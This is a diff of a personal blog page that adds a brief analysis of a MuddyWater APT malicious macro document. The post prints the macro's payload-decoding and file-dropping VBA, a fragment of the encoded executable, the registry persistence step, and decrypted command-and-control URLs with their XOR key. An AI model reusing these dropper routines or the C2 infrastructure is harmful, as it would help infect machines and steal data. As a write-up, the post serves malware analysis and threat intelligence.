@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">849</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/01/08</span>
+                    <span class="post-intro-time">2019/01/10</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,18 +395,158 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="First-Note"><a href="#First-Note" class="headerlink" title="First Note"></a>First Note</h1><ul>
-<li>20190108</li>
+        <h2 id="Muddy-Water-APT-Report"><a href="#Muddy-Water-APT-Report" class="headerlink" title="Muddy Water APT Report"></a>Muddy Water APT Report</h2><h3 id="Others-Info"><a href="#Others-Info" class="headerlink" title="Others Info"></a>Others Info</h3><pre><code>--&gt;MuddyWater APT
+    ---&gt;8899c0dac9f6bb73ce750ae7b3250dbd
+    ---&gt;https://twitter.com/360TIC/status/1081080752438009856
+    ---&gt;https://app.any.run/tasks/810bde9c-962a-445d-8e5d-3d86aec5b3c4
+--&gt;oletools
+    ---&gt;olevba.py
+    ---&gt;https://github.com/decalage2/oletools
+--&gt;Vba2Graph
+    ---&gt;https://twitter.com/MalwareCantFly
+    ---&gt;https://github.com/MalwareCantFly/Vba2Graph
+</code></pre><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>The first important infomation that Macro Code’s procedure.</p>
+<p><img src="./image/dump_vba.png" alt=""></p>
+<p>The Macro Code include many String Datas.</p>
+<p><img src="./image/data_lki.png" alt=""></p>
+<p>The VAB projecte has four function moudle.</p>
+<p><img src="./image/four_function_moudle.png" alt=""></p>
+<p>shift+Left key show marco code &amp; don’t execute code.</p>
+<h4 id="The-sample-auto-execute-marco-code-in-KSAJDHLASLERIUHSALFUH"><a href="#The-sample-auto-execute-marco-code-in-KSAJDHLASLERIUHSALFUH" class="headerlink" title="The sample auto execute marco code in (KSAJDHLASLERIUHSALFUH)."></a>The sample auto execute marco code in (KSAJDHLASLERIUHSALFUH).</h4><ul>
+<li><p>execute PBHYSXGWDW Function</p>
+<pre><code>lin(0) = PBHYSXGWDW(&quot;(D=8((DBI((DBI((DBI((DBI((DBI((FTN?(DH.:(EKDL(F89+(IS:-(GAI.(EKN8(H-SO)3VSL(HJ9.)3V&gt;8(HJ9.(DC&gt;:(H-SJ(DC9*(HJ3J(GAI+(H3.?)3:)((H-&gt;&gt;(HJCJ(H39.(DC&gt;:(EKCO(IS&gt;;(H.3N(DC3L(IRI1)3:))(G*/;(I63I(EKJ*(J(:,)219()3V:.(DBI()1DCH(DBJ*(E/.8(DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBO9(FT&gt;8(DBI((DBI((DBI((DBI((I63H(DBJ*)4BI()4HJ.)4BI((DBI((DBI,(DBI((EKCH(DBI()1E)((G*3M&quot;)
+</code></pre></li>
+<li><p>len is 430</p>
+<pre><code>(D=8((DBI((DBI((DBI((DBI((DBI((FTN?(DH.:(EKDL(F89+(IS:-(GAI.(EKN8(H-SO)3VSL(HJ9.)3V&gt;8(HJ9.(DC&gt;:(H-SJ(DC9*(HJ3J(GAI+(H3.?)3:)((H-&gt;&gt;(HJCJ(H39.(DC&gt;:(EKCO(IS&gt;;(H.3N(DC3L(IRI1)3:))(G*/;(I63I(EKJ*(J(:,)219()3V:.(DBI()1DCH(DBJ*(E/.8(DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBI((DBO9(FT&gt;8(DBI((DBI((DBI((DBI((I63H(DBJ*)4BI()4HJ.)4BI((DBI((DBI,(DBI((EKCH(DBI()1E)((G*3M
+</code></pre></li>
+<li><p>get “Output” string</p>
+<pre><code>For I = 1 To Len(bbbb)
+    Value = Value * 48 + (Asc(Mid(bbbb, I, 1)) - 40) //(get ascii dec data - 40) + x*48
+    If I Mod C = 0 Then
+        While Value &gt; 0
+            v = Value Mod 256
+            If v &gt; 0 Then
+                Output = Chr(v) + Output  //Spliced string
+            End If
+            Value = Value \ 256
+        Wend
+        Value = 0
+    End If
+Next
+</code></pre></li>
+<li><p>The string is PE struct</p>
+<pre><code>4d5a50000200000004000f00ffff0000b80000000000000040001a00000000000000000000000000000000000000000000000000000000000000000000010000ba10000e1fb409cd21b8014ccd219090546869732070726f6772616d206d7573742062652072756e20756e6465722057696e33320d0a24370000000000000
+</code></pre></li>
 </ul>
+<p>So lin(0) == pe header.the lin = PE exe.</p>
+<h4 id="Continue"><a href="#Continue" class="headerlink" title="Continue"></a>Continue</h4><p>Afterwards go!</p>
+<pre><code>//get not use file number.
+ZEZXQPABLI = FreeFile
+PBHYSXGWDW(&quot;(U1T+(WE):&quot;)) &amp; PBHYSXGWDW(&quot;)4.4M(F83F);ODG)8PTG).MO=&quot;
+---&gt;PUBLIC\temp_rt_32.exe
+---&gt;file create
+Open Environ() For Binary Lock Write As #ZEZXQPABLI
+</code></pre><p><img src="./image/create_pe.png" alt=""></p>
+<p>new array,redim array 127,set array data to “4d5a…”,write PE bytes to file.</p>
+<pre><code>ReDim FQHWDEJEKR(Len(ZBNGLIHBUO) \ 2)
+For HFYKUDNQGR = 1 To Len(ZBNGLIHBUO)
+    //return index in &quot;0123456789ABCDEF&quot;
+    ZKMBXQWVVO = InStr(&quot;0123456789ABCDEF&quot;, UCase$(Mid$(ZBNGLIHBUO, HFYKUDNQGR, 1))) - 1
+    If ZKMBXQWVVO &gt;= 0 Then
+        //UBound is max index of array.
+        If KVNRJXJBAT &gt; UBound(FQHWDEJEKR) Then
+            ReDim Preserve FQHWDEJEKR(UBound(FQHWDEJEKR) + 4)
+        End If
+        //&amp;H10 is 0x10 == 16
+        FQHWDEJEKR(KVNRJXJBAT) = FQHWDEJEKR(KVNRJXJBAT) * &amp;H10 + ZKMBXQWVVO
+        TJLXNJBNDH = TJLXNJBNDH + 1
+    End If
+    If TJLXNJBNDH = 2 Or ZKMBXQWVVO &lt; 0 Then
+        If TJLXNJBNDH &gt; 0 Then KVNRJXJBAT = KVNRJXJBAT + 1
+        TJLXNJBNDH = 0
+    End If
+Next
+If TJLXNJBNDH = 0 Then KVNRJXJBAT = KVNRJXJBAT - 1
+If KVNRJXJBAT &lt; 0 Then
+    FQHWDEJEKR = &quot;&quot;
+Else
+    ReDim Preserve FQHWDEJEKR(KVNRJXJBAT)
+End If
+</code></pre><p>Afterwards go “gfjhfgfkjyuity”moudle.</p>
+<p>Same execution process.</p>
+<pre><code>Function FHFFHFGHRTYTDF()
+    ASDWERFGHCBV
+    ZEZXQPABLI = FreeFile
+    Dim Bytes() As Byte
+    Dim UTOHQOASLZ As Integer
+   Open Environ(PBHYSXGWDW(&quot;(U1T+(WE):&quot;)) &amp; PBHYSXGWDW(&quot;)@AU()&lt;V8V).H?9&quot;) For Binary Lock Write As #ZEZXQPABLI
+    For I = LBound(lki) To UBound(lki)
+        Bytes = DFGDFRTYYTJGJ(lki(I))
+        UTOHQOASLZ = UBound(Bytes) - LBound(Bytes) + 1
+        If UTOHQOASLZ &gt; 0 Then
+            Put #ZEZXQPABLI, , Bytes
+        End If
+    Next I
+    Close #ZEZXQPABLI
+End Function
+</code></pre><p>but…..error????</p>
+<p><img src="./image/procedure.png" alt=""></p>
+<p>ememmmmm…</p>
+<p>Change this procedure…..</p>
+<p>Perfect solution!o(<em>￣▽￣</em>)ブ!</p>
+<p><img src="./image/Perfect_solution.png" alt=""></p>
+<p>Create Data.zip file!</p>
+<p><img src="./image/Create_File_data.png" alt=""></p>
+<p>Execute temp_rt_32.exe pe!</p>
+<p><img src="./image/execute_pe.png" alt=""></p>
+<p>The pe is decompressioned Data.zip!</p>
+<p><img src="./image/decompression.png" alt=""></p>
+<h4 id="The-malicious-PE"><a href="#The-malicious-PE" class="headerlink" title="The malicious PE"></a>The malicious PE</h4><p>This Pe is UPX，so dump native pe.</p>
+<p>Dump’s sizes is 2.39Mb….</p>
+<p><img src="./image/dropper.png" alt=""></p>
+<p>The PE is decompressioned c:/users/public/Data.zip file and exectue reg.exe execute UP.txt,the UP.txt is register set opeartation.</p>
+<p><img src="./image/Run_regedit.png" alt=""></p>
+<p>The Real PE is register to Run.</p>
+<p>Now, all file is—&gt;</p>
+<pre><code>Data.zip
+dump_1.exe.bin
+GoogleUpdate.exe.bin
+GoogleUpdate.exe.config.bin
+System.Management.Automation.dll.bin
+temp_gh_12.dat.bin
+temp_rt_32.exe.bin
+UP.txt
+</code></pre><p>GoogleUpdate.exe is malicious. Use de4dot.exe dump, then use dnspy.exe launch.</p>
+<p>It can be seen that temp_gh_12.dat is url file.</p>
+<p>Use xor algorithm to Decrypt.</p>
+<p>This Key hide in PE.</p>
+<p><img src="./image/calc_url.png" alt=""></p>
+<pre><code>{&quot;result&quot;:{&quot;urls&quot;:[&quot;http://shopcloths.ddns.net/users.php?&quot;,&quot;http://getgooogle.hopto.org/users.php?&quot;]},&quot;ok&quot;:true}
+</code></pre><p>URL:</p>
+<pre><code>public static string keyme = &quot;wYbaej5avYrFb&quot;
+
+http://shopcloths.ddns.net/users.php?root=35ksp2i1sek
+
+http://getgooogle.hopto.org/users.php?root=ec5zuzxyhry
+</code></pre><p>Afterwards PE can this url is in progress C2.</p>
+<p>Send Data mode is base64,utf-8,xor.</p>
+<pre><code>Example:
+
+&quot;ADMIN-PC&quot;
+
+&quot;QURNSU4tUEM=&quot;
+
+&quot;UHIRER874893UIUOFUGHEWROUIRGH35&quot;
+</code></pre><p>Final the PE Store encrypted data into files and send file to CC.</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">John Doe</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/01/08/2019-01-08/">http://yoursite.com/2019/01/08/2019-01-08/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/01/08/2019-01-08/">January 8th 2019, 3:22:01 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/01/08/2019-01-08/">January 8th 2019, 3:23:14 pm</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/01/10/apt_report/">http://yoursite.com/2019/01/10/apt_report/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/01/10/apt_report/">January 10th 2019, 10:22:54 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/01/10/apt_report/">January 10th 2019, 5:13:39 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -524,7 +664,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#First-Note"><span class="toc-number">1.</span> <span class="toc-text">First Note</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Muddy-Water-APT-Report"><span class="toc-number">1.</span> <span class="toc-text">Muddy Water APT Report</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Others-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Others Info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#The-sample-auto-execute-marco-code-in-KSAJDHLASLERIUHSALFUH"><span class="toc-number">1.2.1.</span> <span class="toc-text">The sample auto execute marco code in (KSAJDHLASLERIUHSALFUH).</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Continue"><span class="toc-number">1.2.2.</span> <span class="toc-text">Continue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#The-malicious-PE"><span class="toc-number">1.2.3.</span> <span class="toc-text">The malicious PE</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -561,12 +701,12 @@ top:50vh;
     
     
     
-    <div class="archive-year"> 2019 </div>
+    <div class="archive-year"> Invalid date </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/08</span><a class="archive-post-title" href="/2019/01/08/2019-01-08/">[Untitled Post]</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/01/10/apt_report/">[Untitled Post]</a>
         </li>
     
     </ul></div>
